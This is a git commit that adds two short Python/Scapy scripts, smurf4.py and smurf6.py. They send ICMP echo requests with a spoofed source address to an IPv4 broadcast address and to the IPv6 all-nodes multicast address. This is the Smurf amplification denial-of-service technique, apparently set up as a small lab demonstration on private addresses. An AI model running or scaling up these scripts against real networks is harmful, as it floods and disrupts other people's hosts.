b255f102163358f90c98bf3886ab5b285960a558
Andrei Albisoru <44234456+albisorua@users.noreply.github.com>
2022-01-18 23:37:51 +0200

    Add files via upload

--- scripts/smurf4.py
+++ scripts/smurf4.py
@@ -1,1 +1,7 @@
+from scapy.all import *
 
+ip   = IP(src="192.168.1.109" ,dst="192.168.1.255")
+data = "Attack at night"
+
+for i in range(10):
+    send(ip/ICMP(seq=i)/data, count=1)
--- scripts/smurf6.py
+++ scripts/smurf6.py
@@ -1,1 +1,7 @@
+from scapy.all import *
 
+ip   = IPv6(src="fe80::a00:27ff:fecc:898c", dst="ff02::1")
+data = "Attack at night"
+
+for i in range(10):
+    send(ip / ICMPv6EchoRequest(seq=i, data=data), count=1)
